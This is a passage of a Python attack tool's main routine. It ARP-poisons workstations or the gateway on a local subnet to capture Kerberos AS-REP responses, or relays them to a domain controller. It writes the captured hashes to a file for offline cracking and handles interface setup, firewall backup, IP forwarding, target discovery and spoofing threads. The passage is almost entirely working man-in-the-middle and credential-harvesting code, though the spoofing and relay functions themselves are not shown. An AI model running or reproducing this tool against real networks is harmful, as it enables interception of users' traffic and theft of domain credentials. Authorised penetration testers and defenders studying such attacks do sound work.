    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
    group.add_argument('-tf', action='store', metavar = "targets file", help='File containing client workstations IP addresses.')
    group.add_argument('-gw', action='store', metavar = "Gateway IP", help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
    parser.add_argument('-dc', action='store', metavar = "DC IP", help='Domain controller\'s IP.')
    parser.add_argument('-iface', action='store', metavar = "interface", help='Interface to use. Uses default interface if not specified.')
    parser.add_argument('--port', action='store', type=int, default=88, metavar="PORT", help='Port to use for relay server (default: 88). Use alternative port if 88 is in use.')
    parser.add_argument('--skip-redirection', action='store_true', default=False, help='Skip setting up traffic redirection (useful for testing or when using external redirection)')
    group.add_argument('--stop-spoofing', action='store_true', default=False, help='Stops poisoning the target once an AS-REP packet is received from it. False by default.')
    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if not is_admin():
        rich_print_error("Please run as Administrator")
        sys.exit(1)

    parameters = parser.parse_args()

    if parameters.t is not None and parameters.tf is not None :
        rich_print_error('Cannot use -t and -tf simultaneously')
        sys.exit(1)

    # Parse arguments and set global variables
    mode = parameters.mode
    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
    usersfile = parameters.usersfile if parameters.usersfile is not None else 'usernames.seen'
    HashFormat = parameters.format
    iface = parameters.iface if parameters.iface is not None else conf.iface
    disable_spoofing = parameters.disable_spoofing
    stop_spoofing = parameters.stop_spoofing
    dc = parameters.dc
    debug = parameters.debug
    relay_port = parameters.port if hasattr(parameters, 'port') else 88
    skip_redirection = parameters.skip_redirection if hasattr(parameters, 'skip_redirection') else False

    # Validate and select interface
    if iface not in get_if_list():
        if parameters.iface is not None:
            logging.error(f'[!] Interface {iface} was not found. Quitting...')
            sys.exit(1)
        else:
            logging.warning(f'[!] Default interface {iface} is not valid on this system.')
            print('[*] Available interfaces will be shown for selection...')
            iface = select_interface()
            if not iface:
                logging.error('[!] No interface selected. Quitting...')
                sys.exit(1)

    # Set gateway after interface is confirmed
    try:
        gw = parameters.gw if parameters.gw is not None else netifaces.gateways()['default'][netifaces.AF_INET][0]
        rich_print_info(f'[CONFIG] Gateway set to: {gw} (from {"command line" if parameters.gw else "auto-detected default route"})', 'cyan')
    except Exception as e:
        if parameters.gw is not None:
            gw = parameters.gw
            rich_print_info(f'[CONFIG] Using specified gateway: {gw}', 'cyan')
        else:
            rich_print_error(f'[CONFIG] Could not auto-detect gateway: {e}')
            rich_print_error('[CONFIG] Please specify gateway with -gw argument')
            sys.exit(1)

    if iface != conf.iface and parameters.gw is None and not disable_spoofing :
        logging.error('[!] Specified interface is not the default one. You have to specify gateway IP')
        sys.exit(1)

    if stop_spoofing and disable_spoofing :
        logging.warning('[!] --stop-spoofing used with --disable-spoofing. Will ignore --stop-spoofing')
        stop_spoofing = False

    if debug :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG, force=True)
        logging.getLogger('asyncio').setLevel(logging.INFO)
    else :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO, force=True)

    if parameters.mode == 'relay' and parameters.dc is None :
        logging.error('[!] Must specify DC IP in relay mode. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and not valid_ip(parameters.dc) :
        logging.error('[!] DC is not a valid IP.')
        sys.exit(1)

    if parameters.gw is not None and not valid_ip(parameters.gw) :
        logging.error('[!] Gateway is not a valid IP.')
        sys.exit(1)

    # Network interface configuration - with fallback to interface selection
    rich_print_info('Starting network interface configuration...', 'cyan')
    rich_print_info('Processing interface with timeout protection...', 'blue')
    
    # Don't check stop flag during initialization - this was causing early exits
    # The stop flag should only be checked AFTER we start the main mode operations
    
    try:
        rich_print_info('Getting interface IP address...', 'blue')
        # Use Scapy functions to get interface details since we're using Scapy names
        iface_ip = get_if_addr(iface)
        if debug:
            rich_print_info(f'Interface IP: {iface_ip}', 'blue')
        if not iface_ip or iface_ip == '0.0.0.0':
            raise ValueError(f"Interface {iface} has no valid IP address")
        
        rich_print_info('Setting up default netmask and MAC...', 'blue')
        # Try to get netmask and MAC from netifaces if possible
        netmask = '255.255.255.0'  # Default fallback
        hwsrc = None
        
        # Removed stop flag check - was causing premature exits
        
        try:
            if debug:
                rich_print_info('Attempting to get interface details from netifaces...', 'blue')
            # Try to find corresponding netifaces interface by IP matching
            for neti_name in netifaces.interfaces():
                # Removed stop flag check in loop - let initialization complete
                
                try:
                    neti_addrs = netifaces.ifaddresses(neti_name)
                    if netifaces.AF_INET in neti_addrs:
                        neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                        if neti_ip == iface_ip:
                            netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
                            # Get MAC address
                            if netifaces.AF_LINK in neti_addrs:
                                hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
                            break
                except:
                    continue
        except:
            pass
        
        if debug:
            rich_print_info('Netifaces processing completed', 'blue')
        # If we couldn't get MAC from netifaces, use a fallback
        if not hwsrc:
            hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later by ARP operations
        
        if debug:
            rich_print_info(f'Final interface details - IP: {iface_ip}, MAC: {hwsrc}, Netmask: {netmask}', 'blue')
            rich_print_info('Creating subnet configuration...', 'blue')
        iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
        if debug:
            rich_print_info(f'Interface subnet: {iface_subnet}', 'blue')
        rich_print_success('Network interface configuration completed successfully')
        
    except Exception as e:
        if debug:
            rich_print_error(f'Interface configuration failed: {e}')
        rich_print_warning(f'Could not get interface details for {iface}: {e}')
        rich_print_info('Available interfaces will be shown for selection...')
        iface = select_interface()
        if not iface:
            logging.error('[!] No interface selected. Quitting...')
            sys.exit(1)
        
        # Try again with selected interface
        try:
            # Removed stop flag check during retry - let initialization complete
                
            iface_ip = get_if_addr(iface)
            if not iface_ip or iface_ip == '0.0.0.0':
                raise ValueError(f"Selected interface {iface} has no valid IP address")
            
            # Try to get additional details
            netmask = '255.255.255.0'  # Default fallback
            hwsrc = None
            
            try:
                # Try to find corresponding netifaces interface by IP matching
                for neti_name in netifaces.interfaces():
                    # Removed stop flag check in retry loop - let initialization complete
                        
                    try:
                        neti_addrs = netifaces.ifaddresses(neti_name)
                        if netifaces.AF_INET in neti_addrs:
                            neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                            if neti_ip == iface_ip:
                                netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', '255.255.255.0')
                                # Get MAC address
                                if netifaces.AF_LINK in neti_addrs:
                                    hwsrc = neti_addrs[netifaces.AF_LINK][0].get('addr')
                                break
                    except:
                        continue
            except:
                pass
            
            if not hwsrc:
                hwsrc = "00:00:00:00:00:00"  # Will be detected/updated later
                
            iface_subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
            
        except Exception as e2:
            logging.error(f'[!] Could not configure selected interface {iface}: {e2}')
            sys.exit(1)

    if parameters.gw is not None and ipaddress.ip_address(parameters.gw) not in ipaddress.ip_network(iface_subnet) :
        logging.error(f'[!] Gateway not in {iface} subnet. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and not is_dc_up(dc):
        logging.error('[!] DC did not respond to TCP/88 ping probe. Quitting...')
        sys.exit(1)

    if parameters.dc is not None and ipaddress.ip_address(dc) in ipaddress.ip_network(iface_subnet) :
        if parameters.gw is None :
            if mode == 'relay' :
                logging.info('[*] DC seems to be in the same VLAN, will spoof as DC\'s IP')
            else :
                logging.info('[*] DC seems to be in the same VLAN, will poison the DC\'s ARP cache')
            gw = dc
        elif parameters.gw != dc :
            logging.warning('[!] DC seems to be in the same VLAN, will ignore -gw parameter')
            gw = dc

    if not disable_spoofing :
        if parameters.iface is None :
            logging.info(f'[*] No interface specified, will use the default interface : {iface}')
        else :
            logging.info(f'[*] Interface : {iface}')
        if parameters.gw is None and dc != gw:
            logging.info(f'[*] No gateway specified, will use the default gateway : {gw}')
        elif parameters.gw is not None and dc != gw :
            logging.info(f'[*] Gateway IP : {gw}')

    # Initialize usernames sets
    UsernamesCaptured = {}
    UsernamesSeen = set()

    try :
        with open(usersfile, 'r') as f :
            AllUsernames = set(f.read().strip().split('\n'))
    except :
        AllUsernames = set()

    # Handle output file naming
    if os.path.isfile(outfile) :
        i = 1
        while os.path.isfile(f'{outfile}.{i}') :
            # Removed stop flag check during file naming - let initialization complete
            i += 1
        outfile += f'.{i}'

    # Removed stop flag check before firewall operations - these were causing early exits

    # Backup firewall rules
    firewall_backup_file = backup_firewall_rules()
    if not firewall_backup_file:
        logging.error('[!] Could not create any firewall backup. Quitting.')
        sys.exit(1)
    logging.debug('[*] Firewall backup completed')

    # Removed stop flag check before IP forwarding - let initialization complete

    # Get current IP forwarding status and enable it if needed
    original_ip_forward = get_ip_forwarding_status()
    if not original_ip_forward:
        if not enable_ip_forwarding():
            logging.error('[!] Could not enable IP forwarding. Quitting.')
            # Restore firewall backup before exiting
            restore_firewall_rules(firewall_backup_file)
            sys.exit(1)
        logging.debug('[*] Enabled IP forwarding')

    # Removed stop flag check after IP forwarding - let initialization complete

    if parameters.mode == 'listen':
        configure_firewall_forwarding()

    # Target configuration
    if not disable_spoofing :
        if parameters.t is not None :
            if is_valid_ip_list(parameters.t.replace(' ','')) :
                TargetsList = parameters.t.replace(' ','').split(',')
            elif is_valid_ipwithmask(parameters.t) :
                subnet = ipaddress.ip_network(parameters.t, strict=False)
                TargetsList = [str(ip) for ip in subnet.hosts()]
            else :
                logging.error('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
                sys.exit(1)
        elif parameters.tf is not None :
            print('[DEBUG] Processing target list from file...')
            try :
                with open(parameters.tf, 'r') as f:
                    iplist = f.read().strip().replace('\n',',')
            except Exception as e :
                logging.error(f'[-] Could not open file : {e}')
                sys.exit(1)
            if not is_valid_ip_list(iplist) :
                logging.error('[!] IP list in a bad format')
                sys.exit(1)
            TargetsList = iplist.split(',')
        else :
            TargetsList = [str(ip) for ip in iface_subnet.hosts()]
            TargetsList.remove(gw)
            logging.info(f'[*] Targets not supplied, will use local subnet {iface_subnet} minus the gateway')

        if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
            logging.info('[*] Found gateway in targets list. Removing it')
            TargetsList.remove(gw)

        my_ip = get_if_addr(iface)
        if my_ip in TargetsList :
            TargetsList.remove(my_ip)
        
        ip_addresses_not_in_iface_subnet = []
        if parameters.t is not None or parameters.tf is not None :
            logging.debug('[*] Checking targets list...')
            ip_addresses_not_in_iface_subnet = [ip for ip in set(TargetsList) if ipaddress.ip_address(ip) not in ipaddress.ip_network(iface_subnet)]
        if len(ip_addresses_not_in_iface_subnet) > 0 :
            logging.debug(f'[-] These IP addresses are not in {iface} subnet and will be removed from targets list : {ip_addresses_not_in_iface_subnet}')
            logging.warning('[!] Some IP addresses were removed from the targets list. Run in debug mode for more details.')
        if set(TargetsList) == set(ip_addresses_not_in_iface_subnet) : 
            logging.error(f'[-] No target IP was in {iface} subnet. Quitting...')
            sys.exit(1)

        logging.debug('[*] ARP ping : discovering targets')
        print('[DEBUG] Starting ARP discovery for targets...')
        print(f'[DEBUG] Target list has {len(TargetsList)} IPs, plus gateway: {gw}')
        
        # Removed stop flag check before ARP discovery - let initialization complete
            
        mac_addresses = get_mac_addresses(TargetsList + [gw])
        print(f'[DEBUG] ARP discovery completed, found {len(mac_addresses)} responding hosts')

        # Removed stop flag check after ARP discovery - let initialization complete

        if gw not in mac_addresses :
            if gw == dc :
                logging.error('[-] DC did not respond to ARP. Quitting...')
            else :
                logging.error('[-] Gateway did not respond to ARP. Quitting...')
            # Cleanup before exit
            cleanup_all()
            sys.exit(1)

        Targets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)
        InitialTargets = set(TargetsList) - set(ip_addresses_not_in_iface_subnet)

        print(f'[DEBUG] Final target configuration - Targets: {list(Targets)}, InitialTargets: {list(InitialTargets)}')

        if parameters.mode == 'listen':
            print('[DEBUG] Starting listen mode ARP spoofing thread...')
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.daemon = True  # Allow main program to exit even if thread is running
            thread.start()
            print('[DEBUG] ARP spoofing thread started successfully')
            if dc != gw : logging.info('[+] ARP poisoning the gateway\n')
        elif parameters.mode == 'relay' :
            print('[DEBUG] Starting relay mode ARP spoofing...')
            Targets.intersection_update(set(mac_addresses.keys()))
            if Targets == set() :
                logging.error('[-] No target responded to ARP. Quitting...')
                # Cleanup before exit
                cleanup_all()
                sys.exit(1)
            thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
            thread.daemon = True  # Allow main program to exit even if thread is running
            thread.start()
            print('[DEBUG] Relay mode ARP spoofing thread started')
            logging.info('[+] ARP poisoning the client workstations')
        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
    else :
        logging.warning(f'[!] ARP spoofing disabled')

    # Removed stop flag check before mode execution - let the actual mode handle interrupts
    # The flag should only be checked AFTER initialization is complete, within the actual mode

    # Setup is complete, mark it and start live display
    setup_complete = True
    rich_print_success('Configuration completed successfully!')
    rich_print_info(f'Starting {mode} mode with Rich live display...', 'green')
    
    # Windows packet capture troubleshooting info
    if mode == 'listen':
        rich_print_info('Windows Packet Capture Requirements:', 'yellow')
        rich_print_info('1. WinPcap or Npcap must be installed', 'white')
        rich_print_info('2. Must run as Administrator', 'white')
        rich_print_info('3. Windows Defender/Firewall may block packet capture', 'white')
        rich_print_info('4. Some corporate networks block raw packet capture', 'white')
        if not is_admin():
            rich_print_warning('Not running as Administrator - packet capture may fail!')
    
    # Execute the appropriate mode
    try:
        if mode == 'relay' :
            rich_print_info('Starting relay mode execution...')
            
            # Setup enhanced Windows networking for relay mode
            setup_windows_networking()
            
            relay_mode()
        else :
            rich_print_info('Starting listen mode execution...')
            listen_mode()
    except Exception as e:
        rich_print_error(f'Unexpected error during execution: {e}')
        rich_print_warning('Performing emergency cleanup...')
        cleanup_all()
        sys.exit(1)
    finally:
        pass

if __name__ == '__main__':
    main()
